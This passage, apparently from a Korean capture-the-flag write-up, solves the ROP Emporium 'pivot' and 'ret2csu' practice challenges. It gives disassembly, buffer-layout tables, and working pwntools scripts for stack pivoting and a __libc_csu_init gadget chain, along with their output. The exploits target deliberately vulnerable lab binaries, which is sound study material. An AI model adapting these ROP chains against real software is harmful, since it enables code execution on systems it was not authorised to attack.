   0x0000000000400b05 <+5>:     mov    rax,QWORD PTR [rax]
   0x0000000000400b08 <+8>:     ret
   0x0000000000400b09 <+9>:     add    rax,rbp
   0x0000000000400b0c <+12>:    ret
   0x0000000000400b0d <+13>:    nop    DWORD PTR [rax]
End of assembler dump.
```
```
0x00400900: pop rbp ; ret  ;  (1 found)
0x0040098e: call rax ;  (1 found)
```

이 점과 제공된 가젯들을 이용하면 플래그를 leak 할 수 있다.

버퍼 구조(입력하는 순서):
<table>
    <tr><td>ret for xchg : foothold_function@plt</td></tr>
    <tr><td>ret for foothold_function@plt : pop_rax</td></tr>
    <tr><td>param[0] : foothold_function@got</td></tr>
    <tr><td>ret for pop_rax : mov_rax</td></tr>
    <tr><td>ret for mov_rax : pop_rbp</td></tr>
    <tr><td>param[0] : 0x14e</td></tr>
    <tr><td>ret for pop_rbp : add_rax_rbp</td></tr>
    <tr><td>ret for add_rax_rbp : call_rax</td></tr>
</table>

<table>
    <tr><td>dummy data : (0x28 bytes)</td></tr>
    <tr><td>ret for pwnme : pop_rax</td></tr>
    <tr><td>param[0] : pivot_addr</td></tr>
    <tr><td>ret for pop_rax : xchg</td></tr>
</table>

exploit.py:
```python
from pwn import *

e = ELF('./pivot')
l = ELF('./libpivot.so')

add_rax_rbp = 0x400b09
mov_rax = 0x400b05
pop_rax = 0x400b00
call_rax = 0x40098e
pop_rbp = 0x400900
xchg = 0x400b02

p = process(['./pivot'], env = {'LD_PRELOAD':'./libpivot.so'})
p.recvuntil(': ')
pivot_addr = int(p.recvuntil('\n')[:-1], 16)
p.recvuntil('> ')

pl = p64(e.plt['foothold_function']) + p64(pop_rax)
pl += p64(e.got['foothold_function']) + p64(mov_rax)
pl += p64(pop_rbp)
pl += p64(0x14e) + p64(add_rax_rbp)
pl += p64(call_rax)

p.sendline(pl)
p.recvuntil('> ')

pl = 'a'*0x28 + p64(pop_rax)
pl += p64(pivot_addr) + p64(xchg)

print ''
p.sendline()
p.interactive()
```
출력:
```bash
junheah@ubuntu:~/ropemp/pivot$ python exp.py
[*] '/home/junheah/ropemp/pivot/pivot'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RPATH:    './'
[*] '/home/junheah/ropemp/pivot/libpivot.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './pivot': pid 1903
[*] Switching to interactive mode
[*] Process './pivot' stopped with exit code 0 (pid 1903)
foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.soROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

## 7. ret2csu
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
main함수는 pwnme를 호출해 주고
```nasm
Dump of assembler code for function pwnme:
   0x0000000000400714 <+0>:     push   rbp
   0x0000000000400715 <+1>:     mov    rbp,rsp
   ...
   0x000000000040078a <+118>:   lea    rax,[rbp-0x20]
   0x000000000040078e <+122>:   mov    esi,0xb0
   0x0000000000400793 <+127>:   mov    rdi,rax
   0x0000000000400796 <+130>:   call   0x4005d0 <fgets@plt>
   0x000000000040079b <+135>:   mov    eax,0x601038
   0x00000000004007a0 <+140>:   mov    QWORD PTR [rax],0x0
   0x00000000004007a7 <+147>:   mov    rdi,0x0
   0x00000000004007ae <+154>:   nop
   0x00000000004007af <+155>:   leave
   0x00000000004007b0 <+156>:   ret
End of assembler dump.
```
pwnme는 bof에 취약하다.

이 외에도 ret2win이라는 함수가 있다.
```nasm
Dump of assembler code for function ret2win:
   0x00000000004007b1 <+0>:     push   rbp
   0x00000000004007b2 <+1>:     mov    rbp,rsp
   0x00000000004007b5 <+4>:     sub    rsp,0x30
   0x00000000004007b9 <+8>:     mov    DWORD PTR [rbp-0x24],edi ;<a>
   0x00000000004007bc <+11>:    mov    DWORD PTR [rbp-0x28],esi ;<b>
   0x00000000004007bf <+14>:    mov    QWORD PTR [rbp-0x30],rdx ;<c>
   0x00000000004007c3 <+18>:    mov    rax,QWORD PTR [rip+0x15e]        # 0x400928 ; 0xaacca9d1d4d7dcc0
   0x00000000004007ca <+25>:    mov    rdx,QWORD PTR [rip+0x15f]        # 0x400930 ; 0xd5bed0dddfd28920
   0x00000000004007d1 <+32>:    mov    QWORD PTR [rbp-0x20],rax
   0x00000000004007d5 <+36>:    mov    QWORD PTR [rbp-0x18],rdx
   0x00000000004007d9 <+40>:    movzx  eax,WORD PTR [rip+0x158]        # 0x400938
   0x00000000004007e0 <+47>:    mov    WORD PTR [rbp-0x10],ax
   0x00000000004007e4 <+51>:    lea    rax,[rbp-0x20]
   0x00000000004007e8 <+55>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000004007ec <+59>:    mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004007f0 <+63>:    mov    rax,QWORD PTR [rax]
   0x00000000004007f3 <+66>:    xor    rax,QWORD PTR [rbp-0x30]
   0x00000000004007f7 <+70>:    mov    rdx,rax
   0x00000000004007fa <+73>:    mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004007fe <+77>:    mov    QWORD PTR [rax],rdx
   0x0000000000400801 <+80>:    lea    rax,[rbp-0x20]
   0x0000000000400805 <+84>:    add    rax,0x9
   0x0000000000400809 <+88>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040080d <+92>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400811 <+96>:    mov    rax,QWORD PTR [rax]
   0x0000000000400814 <+99>:    xor    rax,QWORD PTR [rbp-0x30]
   0x0000000000400818 <+103>:   mov    rdx,rax
   0x000000000040081b <+106>:   mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040081f <+110>:   mov    QWORD PTR [rax],rdx
   0x0000000000400822 <+113>:   lea    rax,[rbp-0x20]
   0x0000000000400826 <+117>:   mov    rdi,rax
   0x0000000000400829 <+120>:   call   0x4005a0 <system@plt>
   0x000000000040082e <+125>:   nop
   0x000000000040082f <+126>:   leave
   0x0000000000400830 <+127>:   ret
End of assembler dump.
```
되게 귀찮아 보이는 코드가 나왔다. 입력받은 3개의 파라미터를 이용해 복호화해서 이를 system 함수에 집어넣는듯 하다.

다행히도, 이 코드를 다 읽어볼 필요는 없다:
```
gdb-peda$ run
Starting program: ./ret2csu
ret2csu by ROP Emporium

Call ret2win()
The third argument (rdx) must be 0xdeadcafebabebeef

>
```
rop를 통해 rdx를 0xdeadcafebabebeef로 바꾸고 ret2win을 호출하면 될듯 하다.

하지만 문제는,
```
junheah@ubuntu:~/ropemp/ret2csu$ rp++ ret2csu -r 3 | grep 'pop rdx'
junheah@ubuntu:~/ropemp/ret2csu$
```
가젯이 없다.

이 문제는 생각보다 쉽게 해결 할 수 있는데, 바로 문제 제목에서 언급하는 __libc_csu_init 함수를 사용하는 것이다.

```nasm
Dump of assembler code for function __libc_csu_init:
   0x0000000000400840 <+0>:     push   r15
   ...
   0x0000000000400880 <+64>:    mov    rdx,r15
   0x0000000000400883 <+67>:    mov    rsi,r14
   0x0000000000400886 <+70>:    mov    edi,r13d
   0x0000000000400889 <+73>:    call   QWORD PTR [r12+rbx*8]
   0x000000000040088d <+77>:    add    rbx,0x1
   0x0000000000400891 <+81>:    cmp    rbp,rbx
   0x0000000000400894 <+84>:    jne    0x400880 <__libc_csu_init+64>
   0x0000000000400896 <+86>:    add    rsp,0x8
=> 0x000000000040089a <+90>:    pop    rbx
   0x000000000040089b <+91>:    pop    rbp
   0x000000000040089c <+92>:    pop    r12
   0x000000000040089e <+94>:    pop    r13
   0x00000000004008a0 <+96>:    pop    r14
   0x00000000004008a2 <+98>:    pop    r15
   0x00000000004008a4 <+100>:   ret
End of assembler dump.
```
__libc_csu_init+90의 주소로 리턴하면, 6개의 인자를 pop 하고, r12+rbx*8을 call 해준다.

따라서 버퍼구조는 이러하겠다:
<table>
    <tr><td>dummy data : (0x28 bytes)</td></tr>
    <tr><td>ret addr for pwnme : csu+90</td></tr>
    <tr><td>rbx : 0</td></tr>
    <tr><td>rbp : ? (0)</td></tr>
    <tr><td>r12 : csu call addr : ret2win</td></tr>
    <tr><td>r13 : ? (0)</td></tr>
    <tr><td>r14 : ? (0)</td></tr>
    <tr><td>r15 : 0xdeadcafebabebeef</td></tr>
    <tr><td>ret addr for csu : csu+64 </td></tr>
</table>

exploit.py:
```python
from pwn import *

csu1 = 0x40089a
csu2 = 0x400880
ret2win = 0x4007b1
rdx = 0xdeadcafebabebeef

pl = 'a'*0x28
pl += p64(csu1) + p64(0) + p64(0x7ffdfba734e8) + p64(ret2win) + p64(0)*2 + p64(rdx) + p64(csu2)

p = process('./ret2csu')
p.recvuntil('> ')
p.sendline(pl)
p.interactive()
```
결과: libc 안의 r12+rbx*8 을 호출 하는부분에서 segfault가 발생한다.

이유는 호출하려는 함수의 포인터가 아닌 직접적인 주소를 넣었기 때문이다.

검색해보니, rdx 레지스터를 건드리지 않는 _init / _fini 함수 포인터를 사용해서 SIGSEGV를 피하고, __libc_csu_init+100의 ret으로 타깃 함수를 호출하는 방법이 있었다. [참고](https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html)

이 _init과 _fini 포인터는 .dynamic 섹션에서 찾을수 있다.
```bash
gdb-peda$ x/20gx &_DYNAMIC
0x600e20:       0x0000000000000001      0x0000000000000001
0x600e30:       0x000000000000000c      0x0000000000400560
0x600e40:       0x000000000000000d      0x00000000004008b4
0x600e50:       0x0000000000000019      0x0000000000600e10
0x600e60:       0x000000000000001b      0x0000000000000008
0x600e70:       0x000000000000001a      0x0000000000600e18
0x600e80:       0x000000000000001c      0x0000000000000008
0x600e90:       0x000000006ffffef5      0x0000000000400298
0x600ea0:       0x0000000000000005      0x00000000004003c8
0x600eb0:       0x0000000000000006      0x00000000004002c0
```
여기서 _init 포인터의 주소는 0x600e38이다.

버퍼를 재구성하자:
<table>
    <tr><td>dummy data : (0x28 bytes)</td></tr>
    <tr><td>ret addr for pwnme : csu+90</td></tr>
    <tr><td>rbx : 0</td></tr>
    <tr><td>rbp : 1</td></tr>
    <tr><td>r12 : csu call addr : *_init </td></tr>
    <tr><td>r13 : ? (0)</td></tr>
    <tr><td>r14 : ? (0)</td></tr>
    <tr><td>r15 : 0xdeadcafebabebeef</td></tr>
    <tr><td>ret addr for csu : csu+64 </td></tr>
    <tr><td>dummy data for [add rsp, 0x8] : ? (0)</td></tr>
    <tr><td>rbx : ? (0)</td></tr>
    <tr><td>rbp : ? (0)</td></tr>
    <tr><td>r12 : ? (0)</td></tr>
    <tr><td>r13 : ? (0)</td></tr>
    <tr><td>r14 : ? (0)</td></tr>
    <tr><td>r15 : ? (0)</td></tr>
    <tr><td>ret addr for csu+64 : ret2win </td></tr>
</table>

exploit2.py
```python
from pwn import *

initp = 0x600e38
csu1 = 0x40089a
csu2 = 0x400880
ret2win = 0x4007b1
rdx = 0xdeadcafebabebeef

pl = 'a'*0x28
pl += p64(csu1) + p64(0) + p64(1) + p64(initp) + p64(0)*2 + p64(rdx) + p64(csu2)
pl += p64(0)*7 + p64(ret2win)

p = process('./ret2csu')
p.recvuntil('> ')
p.sendline(pl)
p.interactive()
```
출력:
```bash
junheah@ubuntu:~/ropemp/ret2csu$ python exp.py
[+] Starting local process './ret2csu': pid 7788
[*] Switching to interactive mode
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```
